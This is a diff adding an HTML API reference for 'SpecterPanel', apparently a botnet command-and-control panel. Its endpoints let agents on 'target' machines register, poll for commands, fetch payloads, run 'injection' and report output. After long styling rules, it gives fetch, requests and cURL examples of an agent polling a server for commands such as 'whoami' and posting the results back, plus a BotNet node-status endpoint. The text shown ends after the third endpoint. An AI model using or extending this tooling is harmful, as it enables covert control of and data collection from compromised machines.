@@ -1,0 +1,2419 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SpecterPanel API Reference</title>
+  <style>
+    :root {
+      --bg: #0b0f19;
+      --panel: #0f1520;
+      --muted: #8b9bb5;
+      --accent: #7bd389;
+      --accent-glow: rgba(123, 211, 137, 0.3);
+      --danger: #ff6b6b;
+      --warning: #feca57;
+      --info: #54a0ff;
+      --glass: rgba(255,255,255,0.05);
+      --glass-border: rgba(255,255,255,0.1);
+      --code-bg: #0a101a;
+      --mono: 'JetBrains Mono', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
+      --border-radius: 12px;
+      --border-radius-sm: 8px;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      --shadow-lg: 0 16px 48px rgba(0, 0, 0, 0.4);
+      --gradient-bg: linear-gradient(135deg, #061025 0%, #0a1525 50%, #051020 100%);
+      --gradient-accent: linear-gradient(135deg, #7bd389 0%, #5ac768 100%);
+      --gradient-glass: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, rgba(255,255,255,0.02) 100%);
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      margin: 0;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: var(--gradient-bg);
+      color: #e6f0ff;
+      line-height: 1.7;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    /* Custom scrollbar */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.2);
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: var(--accent);
+      border-radius: 4px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+      background: #5ac768;
+    }
+    
+    header {
+      padding: 28px 32px 20px;
+      border-bottom: 1px solid var(--glass-border);
+      background: linear-gradient(135deg, rgba(10, 20, 35, 0.95) 0%, rgba(8, 18, 30, 0.98) 100%);
+      backdrop-filter: blur(20px);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+    
+    header h1 {
+      margin: 0;
+      font-size: 28px;
+      font-weight: 700;
+      background: var(--gradient-accent);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    
+    header p {
+      margin: 12px 0 0;
+      color: var(--muted);
+      font-size: 16px;
+      max-width: 800px;
+      line-height: 1.6;
+    }
+    
+    .header-glow {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: var(--gradient-accent);
+      box-shadow: 0 0 20px var(--accent-glow);
+    }
+    
+    .wrap {
+      display: flex;
+      min-height: calc(100vh - 120px);
+      overflow: hidden;
+    }
+    
+    nav {
+      width: 320px;
+      background: linear-gradient(180deg, rgba(12, 22, 40, 0.95) 0%, rgba(8, 18, 32, 0.9) 100%);
+      padding: 24px;
+      border-right: 1px solid var(--glass-border);
+      overflow: auto;
+      flex-shrink: 0;
+      backdrop-filter: blur(10px);
+    }
+    
+    nav .logo {
+      font-weight: 800;
+      color: var(--accent);
+      margin-bottom: 12px;
+      font-size: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      letter-spacing: -0.5px;
+    }
+    
+    nav .logo svg {
+      filter: drop-shadow(0 0 8px var(--accent-glow));
+    }
+    
+    nav small {
+      display: block;
+      color: var(--muted);
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.5;
+      padding: 12px;
+      background: var(--glass);
+      border-radius: var(--border-radius-sm);
+      border: 1px solid var(--glass-border);
+    }
+    
+    nav .nav-section {
+      margin-top: 28px;
+    }
+    
+    nav .nav-section-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--accent);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-size: 13px;
+    }
+    
+    nav .nav-section-title::before {
+      content: "";
+      width: 3px;
+      height: 16px;
+      background: var(--gradient-accent);
+      border-radius: 2px;
+    }
+    
+    nav a {
+      display: block;
+      padding: 12px 16px;
+      border-radius: var(--border-radius-sm);
+      color: var(--muted);
+      text-decoration: none;
+      margin-bottom: 6px;
+      font-size: 14px;
+      transition: var(--transition);
+      border: 1px solid transparent;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    nav a::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(123, 211, 137, 0.1), transparent);
+      transition: left 0.6s;
+    }
+    
+    nav a:hover, nav a.active {
+      background: var(--gradient-glass);
+      color: #fff;
+      border-color: var(--glass-border);
+      transform: translateX(4px);
+    }
+    
+    nav a:hover::before {
+      left: 100%;
+    }
+    
+    nav a.active {
+      border-left: 3px solid var(--accent);
+      background: linear-gradient(90deg, rgba(123, 211, 137, 0.1), transparent);
+    }
+    
+    nav .nav-footer {
+      margin-top: 32px;
+      color: var(--muted);
+      font-size: 13px;
+      padding-top: 20px;
+      border-top: 1px solid var(--glass-border);
+    }
+    
+    nav .nav-footer code {
+      background: rgba(123, 211, 137, 0.1);
+      color: var(--accent);
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      border: 1px solid rgba(123, 211, 137, 0.2);
+    }
+    
+    main {
+      flex: 1;
+      overflow: auto;
+      padding: 32px;
+      background: transparent;
+    }
+    
+    section {
+      background: var(--gradient-glass);
+      padding: 32px;
+      border-radius: var(--border-radius);
+      margin-bottom: 32px;
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    section::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: var(--gradient-accent);
+      opacity: 0.7;
+    }
+    
+    h2 {
+      margin-top: 0;
+      font-size: 24px;
+      color: #fff;
+      margin-bottom: 20px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+    
+    h3 {
+      font-size: 20px;
+      margin: 28px 0 16px;
+      color: #fff;
+      font-weight: 600;
+    }
+    
+    h4 {
+      font-size: 17px;
+      margin: 24px 0 14px;
+      color: #fff;
+      font-weight: 600;
+    }
+    
+    p {
+      margin-bottom: 20px;
+      font-size: 16px;
+      color: #e6f0ff;
+    }
+    
+    .meta {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      margin-bottom: 20px;
+      align-items: center;
+    }
+    
+    .method-badge {
+      background: var(--gradient-accent);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 700;
+      color: #0b0f19;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 12px var(--accent-glow);
+    }
+    
+    .badge {
+      background: rgba(255,255,255,0.08);
+      padding: 8px 14px;
+      border-radius: var(--border-radius-sm);
+      font-size: 13px;
+      color: var(--muted);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      border: 1px solid var(--glass-border);
+      font-weight: 500;
+    }
+    
+    .badge.get { background: rgba(97, 175, 239, 0.15); color: #61afef; border-color: rgba(97, 175, 239, 0.3); }
+    .badge.post { background: rgba(152, 195, 121, 0.15); color: #98c379; border-color: rgba(152, 195, 121, 0.3); }
+    .badge.delete { background: rgba(224, 108, 117, 0.15); color: #e06c75; border-color: rgba(224, 108, 117, 0.3); }
+    .badge.warning { background: rgba(229, 192, 123, 0.15); color: #e5c07b; border-color: rgba(229, 192, 123, 0.3); }
+    .badge.info { background: rgba(86, 182, 194, 0.15); color: #56b6c2; border-color: rgba(86, 182, 194, 0.3); }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      font-size: 14px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: var(--border-radius-sm);
+      overflow: hidden;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+    }
+    
+    th, td {
+      border: 1px solid var(--glass-border);
+      padding: 16px;
+      text-align: left;
+    }
+    
+    th {
+      background: linear-gradient(135deg, rgba(123, 211, 137, 0.1) 0%, rgba(123, 211, 137, 0.05) 100%);
+      color: var(--accent);
+      font-weight: 600;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    tr:hover {
+      background: rgba(123, 211, 137, 0.05);
+    }
+    
+    pre.code {
+      background: var(--code-bg);
+      padding: 24px;
+      border-radius: var(--border-radius-sm);
+      overflow: auto;
+      font-family: var(--mono);
+      font-size: 14px;
+      color: #dbeef4;
+      margin: 20px 0;
+      border: 1px solid var(--glass-border);
+      line-height: 1.5;
+      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.3);
+      position: relative;
+    }
+    
+    pre.code::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: var(--gradient-accent);
+      opacity: 0.5;
+    }
+    
+    .code-toolbar {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 12px;
+      align-items: center;
+    }
+    
+    .tabs {
+      display: flex;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 4px;
+      border-radius: var(--border-radius-sm);
+      border: 1px solid var(--glass-border);
+    }
+    
+    .tabs button {
+      background: transparent;
+      border: none;
+      color: var(--muted);
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: var(--transition);
+      font-weight: 500;
+    }
+    
+    .tabs button:hover {
+      background: rgba(255,255,255,0.05);
+      color: #fff;
+    }
+    
+    .tabs button.active {
+      background: var(--gradient-accent);
+      color: #0b0f19;
+      box-shadow: 0 2px 8px var(--accent-glow);
+    }
+    
+    .copy-btn {
+      background: rgba(123, 211, 137, 0.1);
+      border: 1px solid rgba(123, 211, 137, 0.3);
+      padding: 8px 16px;
+      border-radius: var(--border-radius-sm);
+      color: var(--accent);
+      cursor: pointer;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: var(--transition);
+      font-weight: 500;
+    }
+    
+    .copy-btn:hover {
+      background: rgba(123, 211, 137, 0.2);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px var(--accent-glow);
+    }
+    
+    .copy-btn svg {
+      width: 16px;
+      height: 16px;
+      fill: currentColor;
+    }
+    
+    .response {
+      display: flex;
+      gap: 20px;
+      margin-top: 20px;
+    }
+    
+    .json {
+      flex: 1;
+    }
+    
+    .hint {
+      font-size: 14px;
+      color: var(--muted);
+      margin: 12px 0;
+      line-height: 1.5;
+      padding: 12px 16px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: var(--border-radius-sm);
+      border-left: 3px solid var(--accent);
+    }
+    
+    .status-code {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-right: 10px;
+      letter-spacing: 0.5px;
+    }
+    
+    .status-200 { background: rgba(123, 211, 137, 0.2); color: var(--accent); border: 1px solid rgba(123, 211, 137, 0.3); }
+    .status-403 { background: rgba(224, 108, 117, 0.2); color: var(--danger); border: 1px solid rgba(224, 108, 117, 0.3); }
+    .status-404 { background: rgba(229, 192, 123, 0.2); color: var(--warning); border: 1px solid rgba(229, 192, 123, 0.3); }
+    
+    .endpoint-path {
+      font-family: var(--mono);
+      color: #fff;
+      font-size: 18px;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 8px 16px;
+      border-radius: var(--border-radius-sm);
+      border: 1px solid var(--glass-border);
+    }
+    
+    .scroll-top {
+      position: fixed;
+      bottom: 32px;
+      right: 32px;
+      background: var(--gradient-accent);
+      color: #0b0f19;
+      border: none;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      opacity: 0;
+      transition: var(--transition);
+      z-index: 100;
+      box-shadow: 0 8px 24px var(--accent-glow);
+      font-weight: bold;
+    }
+    
+    .scroll-top.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    
+    .scroll-top:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 12px 32px var(--accent-glow);
+    }
+    
+    .search-box {
+      margin-bottom: 24px;
+      position: relative;
+    }
+    
+    .search-box input {
+      width: 100%;
+      padding: 14px 48px 14px 16px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--border-radius-sm);
+      color: #fff;
+      font-size: 14px;
+      transition: var(--transition);
+    }
+    
+    .search-box input:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--accent-glow);
+    }
+    
+    .search-box::after {
+      content: "🔍";
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--muted);
+    }
+    
+    .endpoint-summary {
+      margin-bottom: 28px;
+    }
+    
+    .endpoint-summary p {
+      margin-bottom: 12px;
+    }
+    
+    .required {
+      color: var(--danger);
+      font-size: 12px;
+      margin-left: 4px;
+      font-weight: bold;
+    }
+    
+    /* Enhanced animations */
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    section {
+      animation: fadeInUp 0.6s ease-out;
+    }
+    
+    /* Particle background effect */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    .particle {
+      position: absolute;
+      background: var(--accent);
+      border-radius: 50%;
+      opacity: 0.1;
+      animation: float 20s infinite linear;
+    }
+    
+    @keyframes float {
+      0% { transform: translateY(0) rotate(0deg); }
+      100% { transform: translateY(-1000px) rotate(360deg); }
+    }
+    
+    /* Mobile Overlay */
+    .nav-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(4px);
+      z-index: 999;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    
+    .nav-overlay.active {
+      display: block;
+      opacity: 1;
+    }
+    
+    @media (max-width: 900px) {
+      nav {
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        width: 300px;
+        z-index: 1000;
+        transform: translateX(-100%);
+        transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: var(--shadow-lg);
+      }
+      
+      nav.open {
+        transform: translateX(0);
+      }
+      
+      .wrap {
+        padding-left: 0;
+      }
+      
+      header {
+        padding: 20px;
+      }
+      
+      main {
+        padding: 20px;
+      }
+      
+      section {
+        padding: 24px;
+      }
+      
+      .mobile-menu-btn {
+        display: block;
+        background: rgba(123, 211, 137, 0.1);
+        border: 1px solid rgba(123, 211, 137, 0.3);
+        color: var(--accent);
+        font-size: 20px;
+        cursor: pointer;
+        width: 44px;
+        height: 44px;
+        border-radius: var(--border-radius-sm);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: var(--transition);
+        z-index: 1001;
+      }
+      
+      .mobile-menu-btn:hover {
+        background: rgba(123, 211, 137, 0.2);
+        transform: scale(1.05);
+      }
+      
+      .mobile-menu-btn.open {
+        background: rgba(123, 211, 137, 0.2);
+        transform: rotate(90deg);
+      }
+      
+      /* Close button inside mobile nav */
+      .nav-close-btn {
+        display: none;
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: rgba(255, 255, 255, 0.1);
+        border: 1px solid var(--glass-border);
+        color: var(--muted);
+        width: 36px;
+        height: 36px;
+        border-radius: var(--border-radius-sm);
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+        transition: var(--transition);
+      }
+      
+      .nav-close-btn:hover {
+        background: rgba(255, 255, 255, 0.2);
+        color: #fff;
+      }
+      
+      @media (max-width: 900px) {
+        .nav-close-btn {
+          display: flex;
+        }
+      }
+    }
+    
+    @media (min-width: 901px) {
+      .mobile-menu-btn {
+        display: none;
+      }
+      
+      .nav-overlay {
+        display: none !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Particle Background -->
+  <div class="particles" id="particles"></div>
+  
+  <!-- Mobile Navigation Overlay -->
+  <div class="nav-overlay" id="navOverlay"></div>
+  
+  <header>
+    <div class="header-glow"></div>
+    <button class="mobile-menu-btn" id="mobileMenuBtn">☰</button>
+    <div>
+      <h1>SpecterPanel API Reference</h1>
+      <p>Complete documentation for SpecterPanel's Machine & Web APIs. Authenticate using your <strong>API token</strong> in query parameters or JSON body. Examples provided in JavaScript (fetch), Python (requests), and cURL.</p>
+    </div>
+  </header>
+  
+  <div class="wrap">
+    <nav id="sidebar">
+      <!-- Close button for mobile -->
+      <button class="nav-close-btn" id="navCloseBtn">×</button>
+      
+      <div class="logo">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z" fill="#7bd389"/>
+          <path d="M12 6C8.69 6 6 8.69 6 12C6 15.31 8.69 18 12 18C15.31 18 18 15.31 18 12C18 8.69 15.31 6 12 6ZM12 16C9.79 16 8 14.21 8 12C8 9.79 9.79 8 12 8C14.21 8 16 9.79 16 12C16 14.21 14.21 16 12 16Z" fill="#7bd389"/>
+        </svg>
+        SpecterPanel
+      </div>
+      <small>Authentication: Include <code>token</code> in query parameters (GET) or JSON body (POST) for all API requests.</small>
+      
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search endpoints...">
+      </div>
+      
+      <div class="nav-section">
+        <div class="nav-section-title">Machine API (api.py)</div>
+        <a href="#api_ApiCommand" class="nav-link">GET /api/ApiCommand/&lt;target_name&gt;</a>
+        <a href="#api_save_output" class="nav-link">POST /api/Apicommand/save_output</a>
+        <a href="#api_BotNet" class="nav-link">GET /api/BotNet/&lt;target_name&gt;</a>
+        <a href="#api_registor_target" class="nav-link">POST /api/registor_target</a>
+        <a href="#api_get_instraction" class="nav-link">GET /api/get_instraction/&lt;target_name&gt;</a>
+        <a href="#api_lib" class="nav-link">GET /api/lib/&lt;usePyload&gt;</a>
+        <a href="#api_injection" class="nav-link">GET|POST /api/injection/&lt;target_name&gt;</a>
+      </div>
+      
+      <div class="nav-section">
+        <div class="nav-section-title">Web-side API (view.py)</div>
+        <a href="#view_api_command" class="nav-link">GET|POST /api_command/&lt;targetName&gt;</a>
+        <a href="#view_check_update" class="nav-link">GET /check_command_update/&lt;target_name&gt;</a>
+        <a href="#view_delete_command" class="nav-link">POST /api_command/delete</a>
+        <a href="#view_api_command_api" class="nav-link">GET /api_command/api/&lt;targetName&gt;</a>
+        <a href="#view_api_link" class="nav-link">GET|POST /api_link</a>
+        <a href="#view_api_link_delete" class="nav-link">GET /api_link_delete/&lt;ID&gt;</a>
+        <a href="#view_api_link_update" class="nav-link">POST /api_link_update/&lt;ID&gt;</a>
+      </div>
+      
+      <div class="nav-footer">
+        <div style="margin-bottom: 12px; font-weight: 600; color: var(--accent);">Placeholders used:</div>
+        <code>token=ABC123</code><br>
+        <code>target_name=demo_target</code><br>
+        <code>SERVER=your-server.com</code>
+        <a href="/" style="display: block; margin-top: 16px; padding: 12px; background: rgba(123, 211, 137, 0.1); border-radius: var(--border-radius-sm); color: var(--accent); text-decoration: none; text-align: center; border: 1px solid rgba(123, 211, 137, 0.3); transition: var(--transition);">
+          ← Back to Dashboard
+        </a>
+      </div>
+    </nav>
+
+    <main>
+      <section id="intro">
+        <h2>Introduction</h2>
+        <p>This document provides comprehensive documentation for the SpecterPanel API, including both machine-facing endpoints (used by remote agents) and web-facing endpoints (used by the dashboard interface).</p>
+        
+        <h3>Authentication</h3>
+        <p>All API requests require authentication via an API token. There are two ways to provide the token:</p>
+        <ul style="margin-left: 24px; margin-bottom: 20px;">
+          <li><strong>GET requests:</strong> Include as a query parameter (<code>?token=ABC123</code>)</li>
+          <li><strong>POST requests:</strong> Include in the JSON request body (<code>{"token":"ABC123"}</code>)</li>
+        </ul>
+        
+        <h3>Base URL</h3>
+        <p>All examples use <code>SERVER</code> as a placeholder for your server's base URL (e.g., <code>https://panel.example.com</code>). Replace this with your actual server address when making requests.</p>
+        
+        <h3>Rate Limiting</h3>
+        <p>The API enforces rate limits to prevent abuse. If you exceed the limit, you'll receive a <code>429 Too Many Requests</code> response. Wait before making additional requests.</p>
+      </section>
+
+      <!-- API: /api/ApiCommand/<target_name> -->
+      <section id="api_ApiCommand">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api/ApiCommand/&lt;target_name&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve pending commands for a specific target. Remote agents should periodically poll this endpoint to check for new commands.</p>
+          <p class="hint"><strong>Note:</strong> Agents should include their IP and OS information when available to help with command targeting.</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td>query</td>
+            <td><span class="required">*</span></td>
+            <td>API token for authentication</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td>query</td>
+            <td></td>
+            <td>Agent's IP address (optional but recommended)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td>query</td>
+            <td></td>
+            <td>Agent's operating system (optional but recommended)</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>Unique identifier for the target machine</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns all pending commands</div>
+            <pre class="code">{
+  "allCommand": [
+    ["ID", "email", "target_name", "command", "condition", "update"],
+    ["cmd123", "admin@example.com", "demo_target", "whoami", "linux", "2023-08-11 12:00:00"],
+    ...
+  ]
+}</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-403">403</span> Invalid token or unauthorized</div>
+            <pre class="code">{ "Error": "Invalid token" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_ApiCommand-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_ApiCommand-py">Python</button>
+            <button class="tab-btn" data-target="api_ApiCommand-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_ApiCommand-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_ApiCommand-js" class="code">// JavaScript (fetch)
+fetch('http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
+  .then(response => {
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    return response.json();
+  })
+  .then(data => console.log('Received commands:', data))
+  .catch(error => console.error('Error fetching commands:', error));</pre>
+
+        <pre id="api_ApiCommand-py" class="code" style="display:none"># Python (requests)
+import requests
+
+params = {
+    'token': 'ABC123',
+    'ip': '10.0.0.2',
+    'os': 'linux'
+}
+
+try:
+    response = requests.get(
+        'http://SERVER/api/ApiCommand/demo_target',
+        params=params
+    )
+    response.raise_for_status()  # Raises exception for 4XX/5XX status
+    print("Commands:", response.json())
+except requests.exceptions.RequestException as e:
+    print("Error fetching commands:", e)</pre>
+
+        <pre id="api_ApiCommand-curl" class="code" style="display:none"># cURL
+curl -X GET \
+  "http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux" \
+  -H "Accept: application/json"</pre>
+      </section>
+
+      <!-- API: /api/Apicommand/save_output -->
+      <section id="api_save_output">
+        <div class="meta">
+          <span class="method-badge">POST</span>
+          <h2 class="endpoint-path">/api/Apicommand/save_output</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Submit command execution results back to the server. Agents should call this after executing received commands.</p>
+          <p class="hint"><strong>Note:</strong> The output should be an array of arrays, each containing a command ID and its corresponding output.</p>
+        </div>
+        
+        <h3>Request Body (JSON)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>API token matching the registered target</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Target identifier that executed the commands</td>
+          </tr>
+          <tr>
+            <td>output</td>
+            <td>array</td>
+            <td><span class="required">*</span></td>
+            <td>Array of [command_id, output_text] pairs</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td></td>
+            <td>Agent's current IP address (optional)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td></td>
+            <td>Agent's operating system (optional)</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Outputs saved</div>
+            <pre class="code">{ "message": "Outputs were saved successfully" }</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-403">403</span> Invalid token or target</div>
+            <pre class="code">{ "Error": "Invalid token or target" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_save_output-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_save_output-py">Python</button>
+            <button class="tab-btn" data-target="api_save_output-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_save_output-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_save_output-js" class="code">// JavaScript (fetch)
+const commandOutputs = [
+  ["cmd123", "user123\n"],
+  ["cmd124", "Linux hostname 5.4.0-104-generic\n"]
+];
+
+fetch('http://SERVER/api/Apicommand/save_output', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    token: 'ABC123',
+    target_name: 'demo_target',
+    ip: '10.0.0.2',
+    os: 'linux',
+    output: commandOutputs
+  })
+})
+.then(response => response.json())
+.then(data => console.log('Server response:', data))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_save_output-py" class="code" style="display:none"># Python (requests)
+import requests
+
+output_data = {
+    'token': 'ABC123',
+    'target_name': 'demo_target',
+    'ip': '10.0.0.2',
+    'os': 'linux',
+    'output': [
+        ['cmd123', 'user123\n'],
+        ['cmd124', 'Linux hostname 5.4.0-104-generic\n']
+    ]
+}
+
+try:
+    response = requests.post(
+        'http://SERVER/api/Apicommand/save_output',
+        json=output_data
+    )
+    print("Server response:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_save_output-curl" class="code" style="display:none"># cURL
+curl -X POST "http://SERVER/api/Apicommand/save_output" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "token": "ABC123",
+    "target_name": "demo_target",
+    "ip": "10.0.0.2",
+    "os": "linux",
+    "output": [
+      ["cmd123", "user123\\n"],
+      ["cmd124", "Linux hostname 5.4.0-104-generic\\n"]
+    ]
+  }'</pre>
+      </section>
+
+      <!-- API: /api/BotNet/<target_name> -->
+      <section id="api_BotNet">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api/BotNet/&lt;target_name&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve botnet-related data stored for a specific target. This endpoint returns key-value pairs that can be used to store and retrieve arbitrary data associated with a target.</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td>query</td>
+            <td><span class="required">*</span></td>
+            <td>API token for authentication</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>Unique identifier for the target machine</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns botnet data</div>
+            <pre class="code">{
+  "bot_id": "botnet_node_123",
+  "last_seen": "2023-08-11 12:00:00",
+  "status": "active",
+  "custom_data": "any_value"
+}</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-403">403</span> Invalid token or unauthorized</div>
+            <pre class="code">{ "Error": "Invalid token" }</pre>
+          </div>
+        </div>
+
